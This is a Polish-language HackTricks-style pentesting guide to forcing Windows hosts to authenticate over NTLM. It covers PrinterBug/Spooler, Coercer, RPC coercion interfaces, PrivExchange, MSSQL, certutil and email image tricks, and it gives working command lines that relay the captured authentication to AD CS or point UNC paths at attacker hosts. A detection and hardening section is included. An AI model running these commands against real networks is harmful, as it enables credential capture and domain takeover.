# Wymuszanie uprzywilejowanego uwierzytelniania NTLM

{{#include ../../banners/hacktricks-training.md}}

## SharpSystemTriggers

[**SharpSystemTriggers**](https://github.com/cube0x0/SharpSystemTriggers) to **kolekcja** **remote authentication triggers** zakodowanych w języku C# przy użyciu kompilatora MIDL, aby uniknąć zależności od firm trzecich.

## Nadużycie usługi Spooler

Jeśli usługa _**Print Spooler**_ jest **włączona,** możesz użyć niektórych znanych poświadczeń AD, aby **zażądać** od serwera wydruku kontrolera domeny **aktualizacji** dotyczącej nowych zadań drukowania i wskazać, aby **wysłał powiadomienie do określonego systemu**.\
Należy pamiętać, że gdy drukarka wysyła powiadomienie do dowolnego systemu, musi się **uwierzytelnić względem** tego **systemu**. W związku z tym atakujący może zmusić usługę _**Print Spooler**_ do uwierzytelnienia względem dowolnego systemu, a usługa wykorzysta w tym uwierzytelnieniu **konto komputera**.

Pod spodem klasyczny primitive **PrinterBug** nadużywa **`RpcRemoteFindFirstPrinterChangeNotificationEx`** przez **`\\PIPE\\spoolss`**. Atakujący najpierw otwiera uchwyt drukarki/serwera, a następnie podaje fałszywą nazwę klienta w `pszLocalMachine`, dzięki czemu docelowy spooler tworzy kanał powiadomień **z powrotem do hosta kontrolowanego przez atakującego**. Dlatego efekt stanowi **wymuszenie uwierzytelnienia wychodzącego**, a nie bezpośrednie wykonanie kodu.<sup>[[2]](#references)</sup>\
Jeśli szukasz **RCE/LPE** w samym spoolerze, sprawdź [PrintNightmare](printnightmare.md). Ta strona koncentruje się na **coercion i relay**.

### Wyszukiwanie serwerów Windows w domenie

Użyj PowerShell, aby wyświetlić hosty Windows. Serwery są zwykle celami o najwyższym priorytecie, więc najpierw skup się na nich:
```bash
Get-ADComputer -Filter {(OperatingSystem -like "*Windows Server*") -and (Enabled -eq $true)} -Properties DNSHostName |
Select-Object -ExpandProperty DNSHostName > servers.txt
```
### Wykrywanie nasłuchujących usług Spooler

Używając nieznacznie zmodyfikowanego narzędzia [SpoolerScanner](https://github.com/NotMedic/NetNTLMtoSilverTicket) autorstwa @mysmartlogin (Vincenta Le Touxa), sprawdź, czy usługa Spooler nasłuchuje:
```bash
. .\Get-SpoolStatus.ps1
ForEach ($server in Get-Content servers.txt) {Get-SpoolStatus $server}
```
Możesz również użyć `rpcdump.py` w systemie Linux i wyszukać protokół **MS-RPRN**:
```bash
rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
```
Lub szybko testuj hosty z systemu Linux za pomocą **NetExec/CrackMapExec**:
```bash
nxc smb targets.txt -u user -p password -M spooler
```
Jeśli chcesz **enumerować powierzchnie coercion** zamiast tylko sprawdzać, czy endpoint spoolera istnieje, użyj **Coercer scan mode**:<sup>[[5]](#references)</sup>
```bash
coercer scan -u user -p password -d domain -t TARGET --filter-protocol-name MS-RPRN
coercer scan -u user -p password -d domain -t TARGET --filter-pipe-name spoolss
```
Jest to przydatne, ponieważ zobaczenie endpointu w EPM informuje jedynie, że interfejs print RPC jest zarejestrowany. **Nie** gwarantuje to, że każda metoda coercion jest dostępna przy użyciu bieżących uprawnień ani że host wygeneruje użyteczny przepływ uwierzytelniania.

### Poproś usługę o uwierzytelnienie względem dowolnego hosta

Możesz skompilować [SpoolSample z oryginalnego repozytorium](https://github.com/leechristensen/SpoolSample).
```bash
SpoolSample.exe <TARGET> <RESPONDERIP>
```
lub użyj [**dementor.py autorstwa 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) lub [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py), jeśli korzystasz z systemu Linux
```bash
python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
```
Za pomocą **Coercer** możesz bezpośrednio atakować interfejsy spoolera i uniknąć zgadywania, która metoda RPC jest dostępna:<sup>[[5]](#references)</sup>
```bash
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-protocol-name MS-RPRN
coercer coerce -u user -p password -d domain -t TARGET -l LISTENER --filter-method-name RpcRemoteFindFirstPrinterChangeNotificationEx
```
### Nowoczesne callbacki RPC-over-TCP

Nie zakładaj, że pomyślne wywołanie `RpcRemoteFindFirstPrinterChangeNotificationEx` musi generować ruch na TCP/445. **Windows 11 22H2 i nowsze domyślnie używają RPC over TCP do komunikacji związanej z drukowaniem**; RPC over named pipes jest wyłączone, chyba że przywróci je policy lub `RpcUseNamedPipeProtocol=1`. Dlatego listenery obsługujące wyłącznie SMB mogą zgłaszać wysłanie triggera, nie otrzymując jednak callbacku. Microsoft dokumentuje TCP/135 (Endpoint Mapper) oraz dynamiczne porty RPC dla standardowego RPC drukowania; organizacje mogą ograniczyć ten zakres lub wybrać stały port RPC drukowania.<sup>[[10]](#references)</sup>

Aktualny **Impacket `ntlmrelayx.py`** zawiera serwer RPC relay oraz niewielki Endpoint Mapper, domyślnie włączony na TCP/135. Obsługa ta została dodana w czerwcu 2025 roku, konkretnie wraz z zaprezentowanym łańcuchem PrinterBug-to-AD-CS, umożliwiając przekazanie uwierzytelnionego callbacku RPC nawet wtedy, gdy ofiara nie przełącza się awaryjnie na SMB/WebDAV.<sup>[[11]](#references)</sup>

Obsługa RPC relay/EPM jest dostępna w **Impacket 0.13.0 i nowszych**. Przed rozpoczęciem debugowania braku listenera TCP/135 sprawdź, czy nie jest uruchamiany starszy, dostarczony w pakiecie `ntlmrelayx.py`; dane pomocy powinny zawierać obie opcje serwera RPC.<sup>[[12]](#references)</sup>
```bash
python3 -m pip show impacket | grep '^Version:'
ntlmrelayx.py -h | grep -E -- '--rpc-port|--no-rpc-server'
```

```bash
# Recent Impacket: the RPC/EPM listener starts automatically on TCP/135
# Use --template DomainController instead when coercing a DC
sudo ntlmrelayx.py -t 'http://ca.corp.local/certsrv/certfnsh.asp' \
--adcs --template Machine -smb2support

# Trigger after the listener is ready; use a name/address reachable by the victim
printerbug.py 'corp.local/user:password'@TARGET ATTACKER_FQDN
```
Sprawdź w outputcie relay wpisy `Setting up RPC Server on port 135` oraz `RPCD: Received connection`. Jeśli wywołanie RPC zwraca oczekiwany błąd, ale nic nie dociera do listenera, sprawdź print RPC transport policy na hoście ofiary, filtrowanie ruchu wychodzącego, rozwiązywanie DNS oraz to, czy inny proces nie zajmuje już TCP/135. Upewnij się również, że `ntlmrelayx` nie został uruchomiony z opcją `--no-rpc-server`.

### Wymuszanie HTTP zamiast SMB za pomocą WebClient

Na systemach nadal używających **RPC over named pipes** (legacy builds lub zachowanie przywrócone przez policy) klasyczny PrinterBug zwykle powoduje uwierzytelnienie **SMB** do `\\attacker\share`, co nadal jest przydatne do **capture**, **relay do celów HTTP** lub **relay tam, gdzie brakuje SMB signing**.\
Jednak relay **SMB do SMB** jest często blokowany przez **SMB signing**, dlatego operatorzy mogą preferować wymuszenie uwierzytelnienia **HTTP/WebDAV**. Nie jest to fallback dla opisanego powyżej zachowania RPC-over-TCP.

Jeśli na celu działa usługa **WebClient**, listener można określić w formie, która spowoduje użycie przez Windows **WebDAV over HTTP**:
```bash
printerbug.py 'domain/username:password'@TARGET 'ATTACKER@80/share'
coercer coerce -u user -p password -d domain -t TARGET -l ATTACKER --http-port 80 --filter-protocol-name MS-RPRN
```
Jest to szczególnie przydatne podczas łączenia z **`ntlmrelayx --adcs`** lub innymi celami HTTP relay, ponieważ pozwala uniknąć polegania na możliwości przeprowadzenia SMB relay na wymuszonym połączeniu. Należy pamiętać, że usługa **WebClient musi działać** na ofierze, aby wariant HTTP/WebDAV zadziałał.

### Łączenie z Unconstrained Delegation

Jeśli atakujący przejął komputer skonfigurowany dla [Unconstrained Delegation](unconstrained-delegation.md), może **wymusić uwierzytelnienie drukarki na tym komputerze**. Konto komputera drukarki **TGT** jest następnie buforowane w pamięci hosta z unconstrained delegation, skąd atakujący może je pobrać i ponownie wykorzystać za pomocą [Pass the Ticket](pass-the-ticket.md).

### Uwagi dotyczące wykrywania i hardeningu

Najbardziej niezawodnym sposobem usunięcia PrinterBug z DC, PAW lub serwera, który nie drukuje, jest zatrzymanie i wyłączenie usługi Spooler. Jeśli drukowanie jest wymagane, należy zabezpieczyć każde możliwe miejsce docelowe relay (podpisywanie serwera SMB, podpisywanie LDAP/LDAP channel binding oraz EPA w usługach HTTP, takich jak AD CS), zamiast zakładać, że blokowanie TCP/445 na ścieżce callbacku jest wystarczające.<sup>[[1]](#references)</sup>
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
Jeśli host nadal wymaga **lokalnego drukowania**, węższą kontrolą jest GPO `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`. Uniemożliwia to spoolerowi akceptowanie zdalnych połączeń klienckich (i udostępnianie drukarek), pozostawiając usługę dostępną lokalnie; po zastosowaniu ustawienia zrestartuj spooler, a następnie ponownie wykonaj opisane powyżej kontrole dostępności MS-RPRN.<sup>[[13]](#references)</sup>

Detekcja powinna korelować uwierzytelnione wywołanie MS-RPRN UUID `12345678-1234-abcd-ef00-0123456789ab`, szczególnie opnum 62/65 z wartością callbacku inną niż lokalna, oraz natychmiastowe wychodzące połączenie SMB, HTTP lub RPC z hosta spoolera. Twórz baseline **interface UUID/opnum oraz par źródło/cel**, a nie tylko dostępu do `\PIPE\spoolss`, ponieważ współczesne stosy drukowania mogą umieszczać callback w RPC-over-TCP.<sup>[[1]](#references)[[10]](#references)[[11]](#references)</sup>

## RPC Force authentication

[Coercer](https://github.com/p0dalirius/Coercer)<sup>[[5]](#references)</sup>

### Macierz coercion ścieżek RPC UNC (interfejsy/opnum wywołujące wychodzące uwierzytelnianie)
- MS-RPRN (Print System Remote Protocol)
- Pipe: \\PIPE\\spoolss
- IF UUID: 12345678-1234-abcd-ef00-0123456789ab
- Opnums: 62 RpcRemoteFindFirstPrinterChangeNotification; 65 RpcRemoteFindFirstPrinterChangeNotificationEx
- Tools: PrinterBug / SpoolSample / Coercer<sup>[[1]](#references)[[6]](#references)</sup>
- MS-PAR (Print System Asynchronous Remote)
- Pipe: \\PIPE\\spoolss
- IF UUID: 76f03f96-cdfd-44fc-a22c-64950a001209
- Notes: asynchroniczny interfejs drukowania na tym samym pipe spoolera; użyj Coercer do wyliczenia osiągalnych metod na danym hoście<sup>[[1]](#references)[[6]](#references)</sup>
- MS-EFSR (Encrypting File System Remote Protocol)
- Pipes: \\PIPE\\efsrpc (również przez \\PIPE\\lsarpc, \\PIPE\\samr, \\PIPE\\lsass, \\PIPE\\netlogon)
- IF UUIDs: c681d488-d850-11d0-8c52-00c04fd90f7e ; df1941c5-fe89-4e79-bf10-463657acf44d
- Opnums commonly abused: 0, 4, 5, 6, 7, 12, 13, 15, 16
- Tool: PetitPotam<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>
- MS-DFSNM (DFS Namespace Management)
- Pipe: \\PIPE\\netdfs
- IF UUID: 4fc742e0-4a10-11cf-8273-00aa004ae673
- Opnums: 12 NetrDfsAddStdRoot; 13 NetrDfsRemoveStdRoot
- Tool: DFSCoerce<sup>[[1]](#references)[[6]](#references)[[8]](#references)</sup>
- MS-FSRVP (File Server Remote VSS)
- Pipe: \\PIPE\\FssagentRpc
- IF UUID: a8e0653c-2744-4389-a61d-7373df8b2292
- Opnums: 8 IsPathSupported; 9 IsPathShadowCopied
- Tool: ShadowCoerce<sup>[[1]](#references)[[6]](#references)[[9]](#references)</sup>
- MS-EVEN (EventLog Remoting)
- Pipe: \\PIPE\\even
- IF UUID: 82273fdc-e32a-18c3-3f78-827929dc23ea
- Opnum: 9 ElfrOpenBELW
- Tool: CheeseOunce<sup>[[1]](#references)</sup>

Uwaga: Metody te akceptują parametry, które mogą zawierać ścieżkę UNC (np. `\\attacker\share`). Podczas przetwarzania Windows uwierzytelni się (w kontekście komputera/użytkownika) do tego UNC, umożliwiając przechwycenie lub relay NetNTLM.\
W przypadku abuse spoolera **MS-RPRN opnum 65** pozostaje najczęściej stosowanym i najlepiej udokumentowanym primitive, ponieważ specyfikacja protokołu wyraźnie stwierdza, że serwer tworzy kanał powiadomień z powrotem do klienta określonego przez `pszLocalMachine`.<sup>[[2]](#references)</sup>

### MS-EVEN: ElfrOpenBELW (opnum 9) coercion
- Interface: MS-EVEN over \\PIPE\\even (IF UUID 82273fdc-e32a-18c3-3f78-827929dc23ea)<sup>[[3]](#references)</sup>
- Call signature: ElfrOpenBELW(UNCServerName, BackupFileName="\\\\attacker\\share\\backup.evt", MajorVersion=1, MinorVersion=1, LogHandle)<sup>[[4]](#references)</sup>
- Effect: cel próbuje otworzyć podaną ścieżkę logu kopii zapasowej i uwierzytelnia się do kontrolowanego przez atakującego UNC.<sup>[[1]](#references)</sup>
- Practical use: wymuszenie na zasobach Tier 0 (DC/RODC/Citrix/etc.) wysłania NetNTLM, a następnie wykonanie relay do endpointów AD CS (scenariusze ESC8/ESC11) lub innych uprzywilejowanych usług.<sup>[[1]](#references)</sup>

## PrivExchange

Atak `PrivExchange` jest wynikiem błędu w **funkcji `PushSubscription` serwera Exchange**. Funkcja ta pozwala wymusić na serwerze Exchange, przez dowolnego użytkownika domenowego posiadającego skrzynkę pocztową, uwierzytelnienie do dowolnego hosta wskazanego przez klienta za pośrednictwem HTTP.

Domyślnie **usługa Exchange działa jako SYSTEM** i otrzymuje nadmierne uprawnienia (w szczególności ma **WriteDacl privileges on the domain pre-2019 Cumulative Update**). Błąd ten można wykorzystać do wykonania **relay informacji do LDAP, a następnie wyodrębnienia bazy danych NTDS domeny**. Jeśli relay do LDAP nie jest możliwy, błąd nadal można wykorzystać do wykonania relay i uwierzytelnienia do innych hostów w domenie. Pomyślne wykorzystanie tego ataku zapewnia natychmiastowy dostęp do Domain Admin przy użyciu dowolnego uwierzytelnionego konta domenowego.

## Wewnątrz Windows

Jeśli jesteś już wewnątrz maszyny Windows, możesz wymusić na Windows połączenie z serwerem przy użyciu uprzywilejowanych kont za pomocą:

### Defender MpCmdRun
```bash
C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2010.7-0\MpCmdRun.exe -Scan -ScanType 3 -File \\<YOUR IP>\file.txt
```
### MSSQL
```sql
EXEC xp_dirtree '\\10.10.17.231\pwn', 1, 1
```
[MSSQLPwner](https://github.com/ScorpionesLabs/MSSqlPwner)
```shell
# Issuing NTLM relay attack on the SRV01 server
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -link-name SRV01 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on chain ID 2e9a3696-d8c2-4edd-9bcc-2908414eeb25
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth -chain-id 2e9a3696-d8c2-4edd-9bcc-2908414eeb25 ntlm-relay 192.168.45.250

# Issuing NTLM relay attack on the local server with custom command
mssqlpwner corp.com/user:lab@192.168.1.65 -windows-auth ntlm-relay 192.168.45.250
```
Lub użyj tej innej techniki: [https://github.com/p0dalirius/MSSQL-Analysis-Coerce](https://github.com/p0dalirius/MSSQL-Analysis-Coerce)

### Certutil

Możliwe jest użycie lolbina certutil.exe (binarny plik podpisany przez Microsoft) do wymuszenia uwierzytelniania NTLM:
```bash
certutil.exe -syncwithWU  \\127.0.0.1\share
```
## HTML injection

### Przez email

Jeśli znasz **adres email** użytkownika, który loguje się na maszynie, którą chcesz przejąć, możesz po prostu wysłać mu **email z obrazem 1x1**, takim jak
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
Po jego otwarciu Windows próbuje przeprowadzić uwierzytelnianie.

### MitM

Jeśli możesz przeprowadzić atak MitM i wstrzyknąć kod HTML do strony wyświetlanej przez ofiarę, spróbuj wstrzyknąć obraz, taki jak:
```html
<img src="\\10.10.17.231\test.ico" height="1" width="1" />
```
## Inne sposoby wymuszania i phishingu uwierzytelniania NTLM


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

## Łamanie NTLMv1

Jeśli możesz przechwycić [challenge'e NTLMv1, tutaj przeczytasz, jak je złamać](../ntlm/index.html#ntlmv1-attack).\
_Pamiętaj, że aby złamać NTLMv1, musisz ustawić challenge Respondera na „1122334455667788”_



## References

- [1] [Unit 42 – Wymuszanie uwierzytelniania wciąż ewoluuje](https://unit42.paloaltonetworks.com/authentication-coercion/)
- [2] [Microsoft – MS-RPRN: RpcRemoteFindFirstPrinterChangeNotificationEx (Opnum 65)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/eb66b221-1c1f-4249-b8bc-c5befec2314d)
- [3] [Microsoft – MS-EVEN: Protokół zdalnego dostępu do dziennika zdarzeń](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/55b13664-f739-4e4e-bd8d-04eeda59d09f)
- [4] [Microsoft – MS-EVEN: ElfrOpenBELW (Opnum 9)](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-even/4db1601c-7bc2-4d5c-8375-c58a6f8fc7e1)
- [5] [p0dalirius – Coercer](https://github.com/p0dalirius/Coercer)
- [6] [p0dalirius – windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)
- [7] [PetitPotam (MS-EFSR)](https://github.com/topotam/PetitPotam)
- [8] [DFSCoerce (MS-DFSNM)](https://github.com/Wh04m1001/DFSCoerce)
- [9] [ShadowCoerce (MS-FSRVP)](https://github.com/ShutdownRepo/ShadowCoerce)
- [10] [Microsoft – Aktualizacje połączeń RPC dla drukowania w systemie Windows 11](https://learn.microsoft.com/en-us/troubleshoot/windows-client/printing/windows-11-rpc-connection-updates-for-print)
- [11] [Fortra Impacket – Serwer RPC relay i Endpoint Mapper dla ntlmrelayx](https://github.com/fortra/impacket/pull/1974)
- [12] [Wydanie Fortra Impacket 0.13.0](https://github.com/fortra/impacket/releases/tag/impacket_0_13_0)
- [13] [Microsoft – Policy CSP: Zezwalaj usłudze Print Spooler na akceptowanie połączeń klientów](https://learn.microsoft.com/en-us/windows/client-management/mdm/policy-csp-admx-printing2)
{{#include ../../banners/hacktricks-training.md}}
